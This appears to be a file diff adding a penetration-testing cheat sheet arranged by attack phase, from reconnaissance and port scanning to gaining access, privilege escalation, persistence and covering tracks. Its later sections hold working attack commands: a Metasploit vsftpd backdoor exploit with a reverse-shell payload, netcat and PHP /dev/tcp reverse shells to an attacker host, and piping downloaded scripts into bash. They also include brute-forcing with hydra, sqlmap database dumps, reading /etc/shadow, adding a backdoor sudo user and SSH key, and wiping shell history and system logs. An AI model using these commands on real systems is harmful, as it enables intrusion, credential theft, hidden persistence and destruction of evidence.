@@ -1,0 +1,235 @@
+Phase : Reconnaissance, Scanning, Gainning Access, Maintaining Access, Clearing Tracks, Reporting
+
+Recon Method : Gather inital Information -> Determine the network Range -> Identify active machine -> Dicover Open Ports and access points -> Fingerprint the operating system -> Uncover the service on ports -> Map the network
+
+Key of Footprinting: Network Discovery -> DNS Enum -> Whois Lookup -> Website Analysis -> Social Eng -> Email Harvesting -> Search Engine Queries -> Competitive Intelligence
+
+Scanning Method : Port Scanning -> Network Scanning -> Vulnerability Scanning
+
+Information Gathering/Recon: You can use full bug bunting Recon Method
+
+whois example.com
+dig example.com +short
+nslookup example.com
+dig ns example.com
+dnsrecon -d example.com
+
+sublist3r -d example.com
+subfinder -d example.com 
+assetfinder --subs-only example.com 
+findomain -t example.com --output
+
+site:example.com filetype:pdf
+site:example.com intitle:index.of
+site:example.com inurl:admin
+
+theHarvester -d example.com -b linkedin
+
+rustscan -a 10.10.117.140
+nmap -p 21,22,80 -sV 10.10.117.140 
+
+nmap <subdomain.com>
+nmap <subdomain.com> -p 80,443,22
+nmap <subdomain.com> -sV
+nmap <subdomain.com> -sS
+nmap <subdomain.com> -sU
+nmap -A target.com
+nmap <subdomain.com> --script=vuln
+nmap <subdomain.com> --script=enum
+nmap --script=name of script 10.1.1.0/24
+nmap --script=default <target IP>
+nmap --script=mysql <target IP>
+nmap --script=vulners <target IP>
+
+nc target.com 80
+curl -I http://target.com
+wget --server-response http://target.com
+whatweb http://target.com
+
+dirsearch -u http://target.com -e php,html
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+theHarvester -d example.com -b all
+
+curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | grep -v '\*' | sort -u
+curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
+curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | while read domain; do ip=$(dig +short "$domain" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n1); [[ -n "$ip" ]] && echo "$domain - $ip"; done
+
+
+Link:
+https://freelancermijan.github.io/reconengine/
+https://dnsdumpster.com/
+https://subdomainfinder.c99.nl/
+https://osint.sh/subdomain/
+https://hackertarget.com/find-dns-host-records/
+https://crt.sh/
+https://chaos.projectdiscovery.io/
+
+Scanning:
+nmap target.com
+nmap -p- target.com
+nmap -sV target.com
+nmap -A target.com
+nmap -oN scan.txt target.com
+nmap -sS target.com
+nmap -p 1-1000 target.com
+nmap --script vuln target.com
+nmap -p 21 --script ftp-anon target.com
+nmap -p 22 --script ssh2-enum-algos,ssh-hostkey target.com
+nmap -p 139,445 --script smb-enum-shares,smb-enum-users target.com
+nmap -p 80,443 --script http-title,http-methods,http-enum target.com
+nmap -p 80,443 --script http-title,http-methods,http-enum target.com
+nmap --script vuln target.com
+
+rustscan -a target.com
+rustscan -a target.com -r 1-65535
+
+enum4linux target.com
+smbclient -L //target.com/
+
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+dirsearch -u http://target.com -e php,html,txt
+
+dnsrecon -d target.com
+dnsenum target.com
+fierce --domain target.com
+nikto -h http://target.com
+nc target.com 80
+telnet target.com 80
+
+Link:
+https://dnschecker.org/port-scanner.php
+https://hackertarget.com/nmap-online-port-scanner/
+
+Gainning Access:
+msfconsole
+search vsftpd
+search type:exploit name:ftp
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS target.com
+set RPORT 21
+set PAYLOAD linux/x86/shell_reverse_tcp
+set LHOST your-ip
+run
+
+searchsploit apache 2.4.49
+searchsploit -m linux/http/apache_mod_cgi_bash_env_exec
+
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+sqlmap -u "http://target.com/page.php?id=1" --dump-all
+
+hydra -l admin -P rockyou.txt ssh://target.com
+hydra -L users.txt -P passwords.txt ftp://target.com
+medusa -h target.com -u admin -P passwords.txt -M ssh
+
+enum4linux target.com
+smbclient -L //target.com/
+
+ftp target.com
+
+🔹 With Netcat (On target): nc attacker_ip 4444 -e /bin/bash
+🔹 Listener on your machine: nc -lvnp 4444
+🔹 PHP Reverse Shell: <?php system("bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'"); ?>
+
+Exploitation:
+🔹 Linux Enumeration (Manual):
+whoami && id && hostname
+uname -a
+cat /etc/os-release
+ps aux
+sudo -l
+
+🔹 Auto Enum Scripts (Linux):
+# Linpeas
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh && ./linpeas.sh
+
+# Les.sh
+curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash
+
+# LinEnum
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh && ./LinEnum.sh
+
+🔐 SUDO Privilege Abuse (Linux):
+sudo -l
+sudo vim -c ':!/bin/sh'
+
+🔓 SUID Binary Exploits (Linux):
+find / -perm -4000 2>/dev/null
+find . -exec /bin/sh \; -quit
+
+🔓 Kernel Exploits (Linux):
+uname -r
+
+💼 Stored Credentials
+cat /etc/passwd
+cat /etc/shadow  # if readable
+grep -i 'password' /var/www/html/* 2>/dev/null
+
+Post Exploitation:
+
+🔹 System Information Gathering:
+whoami
+id
+uname -a
+hostname
+ip a
+netstat -tulnp
+
+🔐 Credential Dumping:
+cat /etc/passwd
+cat /etc/shadow     # If root
+grep -r "password" /home /var/www 2>/dev/null
+
+🦠 Persistence:
+useradd hacker -m -s /bin/bash
+echo 'hacker:hackpass' | chpasswd
+usermod -aG sudo hacker
+
+mkdir ~/.ssh
+echo "attacker_key" >> ~/.ssh/authorized_keys
+
+🗑️ Covering Tracks:
+history -c && history -w
+rm ~/.bash_history
+cat /dev/null > /var/log/auth.log
+cat /dev/null > /var/log/syslog
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
